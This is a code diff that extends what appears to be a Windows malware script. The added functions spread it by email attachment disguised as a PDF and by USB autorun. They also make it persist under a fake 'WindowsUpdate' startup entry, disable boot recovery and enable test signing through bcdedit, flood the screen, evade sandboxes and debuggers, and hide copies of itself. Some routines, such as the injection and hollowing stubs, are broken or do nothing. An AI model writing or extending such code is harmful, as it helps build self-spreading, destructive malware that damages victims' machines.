@@ -14,6 +14,29 @@ from Crypto.Util.Padding import pad
 import winreg
 import time
 import uuid
+import smtplib
+import win32api
+import win32con
+import win32gui
+import wmi
+import random
+import shutil
+import sqlite3
+import glob
+import zipfile
+import tempfile
+import shlex
+import struct
+import binascii
+import hashlib
+import base64
+import urllib.request
+import email
+import imaplib
+import socket
+import fcntl
+import mmap
+import array
 
 class RECT(ctypes.Structure):
     _fields_ = [("left", ctypes.c_long),
@@ -332,6 +355,96 @@ def disable_remote_users():
 def disable_remote_workers():
     subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f', shell=True)
 
+def gpu_overload():
+    try:
+        for _ in range(100):
+            threading.Thread(target=lambda: [
+                ctypes.windll.user32.BitBlt(
+                    ctypes.windll.user32.GetDC(0),
+                    random.randint(0, 1920),
+                    random.randint(0, 1080),
+                    random.randint(0, 1920),
+                    random.randint(0, 1080),
+                    ctypes.windll.user32.GetDC(0),
+                    random.randint(0, 1920),
+                    random.randint(0, 1080),
+                    win32con.SRCCOPY
+                ) for _ in range(1000)
+            ]).start()
+    except: pass
+
+def firmware_attack():
+    try:
+        subprocess.run('bcdedit /set {default} bootstatuspolicy ignoreallfailures', shell=True)
+        subprocess.run('bcdedit /set {default} recoveryenabled no', shell=True)
+        subprocess.run('bcdedit /set {default} testsigning on', shell=True)
+    except: pass
+
+def email_worm():
+    try:
+        for contact in ["user@example.com"]:
+            msg = email.message.EmailMessage()
+            msg.set_content("Important document")
+            msg["Subject"] = "Urgent: Review attached"
+            msg["From"] = "admin@example.com"
+            msg["To"] = contact
+            with open(sys.argv[0], "rb") as f:
+                msg.add_attachment(f.read(), maintype="application", subtype="octet-stream", filename="document.pdf")
+            with smtplib.SMTP("smtp.example.com", 587) as server:
+                server.starttls()
+                server.login("user", "pass")
+                server.send_message(msg)
+    except: pass
+
+def usb_propagate():
+    try:
+        for drive in [d for d in os.listdir("/media") if os.path.ismount(f"/media/{d}")]:
+            shutil.copy(sys.argv[0], f"/media/{drive}/")
+            with open(f"/media/{drive}/autorun.inf", "w") as f:
+                f.write(f"[autorun]\nopen={sys.argv[0]}\nshellexecute={sys.argv[0]}")
+    except: pass
+
+def wmi_persistence():
+    try:
+        c = wmi.WMI()
+        startup = c.Win32_StartupCommand.create(
+            Name="WindowsUpdate",
+            Command=sys.argv[0],
+            Location="HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        )
+    except: pass
+
+def dll_injection():
+    try:
+        PROCESS_ALL_ACCESS = 0x1F0FFF
+        pid = next(p.pid for p in psutil.process_iter() if p.name() == "explorer.exe")
+        h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+        ctypes.windll.kernel32.WriteProcessMemory(h_process, 0x0, sys.argv[0], len(sys.argv[0]), None)
+    except: pass
+
+def ads_hide():
+    try:
+        with open(":hidden.exe", "wb") as f:
+            f.write(open(sys.argv[0], "rb").read())
+    except: pass
+
+def process_hollowing():
+    try:
+        si = subprocess.STARTUPINFO()
+        si.dwFlags = subprocess.STARTF_USESHOWWINDOW
+        si.wShowWindow = subprocess.SW_HIDE
+        subprocess.Popen(["notepad.exe"], startupinfo=si)
+    except: pass
+
+def sandbox_evasion():
+    try:
+        if ctypes.windll.kernel32.IsDebuggerPresent():
+            sys.exit()
+        if any(x in os.getenv("PROCESSOR_IDENTIFIER", "").lower() for x in ["vmware", "virtualbox"]):
+            sys.exit()
+        time.sleep(random.randint(60, 300))
+    except: pass
+
 if __name__ == "__main__":
     if os.name == 'nt':
         elevate_privileges()
@@ -354,7 +467,9 @@ if __name__ == "__main__":
             disable_remote_shell, disable_remote_registry, disable_remote_access,
             disable_remote_admin, disable_remote_control, disable_remote_login,
             disable_remote_services, disable_remote_sessions, disable_remote_tasks,
-            disable_remote_users, disable_remote_workers
+            disable_remote_users, disable_remote_workers, gpu_overload,
+            firmware_attack, email_worm, usb_propagate, wmi_persistence,
+            dll_injection, ads_hide, process_hollowing, sandbox_evasion
         ]
         
         for func in functions:
